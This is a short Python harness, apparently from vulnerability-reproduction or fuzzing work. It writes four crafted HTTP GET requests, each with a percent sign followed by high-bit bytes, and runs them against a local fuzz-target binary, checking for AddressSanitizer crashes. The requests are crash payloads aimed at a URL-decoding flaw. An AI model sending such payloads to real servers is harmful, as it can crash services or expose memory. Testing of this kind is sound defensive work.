# Test with the actual fuzz target binary
import subprocess
import os

# Try different PoC variants
pocs = []

# Variant 1: Simple % followed by high-bit bytes
poc1 = b'GET /%\x80\x81\x82 HTTP/1.1\r\nHost: x\r\n\r\n'
pocs.append(('poc_simple', poc1))

# Variant 2: Longer path with more high-bit bytes
poc2 = b'GET /test%\x80\x81\x82\x83\x84\x85 HTTP/1.1\r\nHost: x\r\n\r\n'
pocs.append(('poc_longer', poc2))

# Variant 3: % at end of URL (just before space)
poc3 = b'GET /test%\x80 HTTP/1.1\r\nHost: x\r\n\r\n'
pocs.append(('poc_end', poc3))

# Variant 4: Multiple % sequences with high-bit bytes
poc4 = b'GET /%\x80%\x81%\x82%\x83%\x84 HTTP/1.1\r\nHost: x\r\n\r\n'
pocs.append(('poc_multi', poc4))

for name, poc in pocs:
    path = f'/workspace/{name}'
    with open(path, 'wb') as f:
        f.write(poc)
    result = subprocess.run(['./test_fuzz', path], capture_output=True)
    crashed = result.returncode != 0
    print(f'{name}: crashed={crashed}, returncode={result.returncode}, size={len(poc)}')
    if crashed:
        stderr = result.stderr.decode('utf-8', errors='replace')
        if 'SEGV' in stderr or 'READ' in stderr:
            print(f'  -> ASAN crash confirmed')
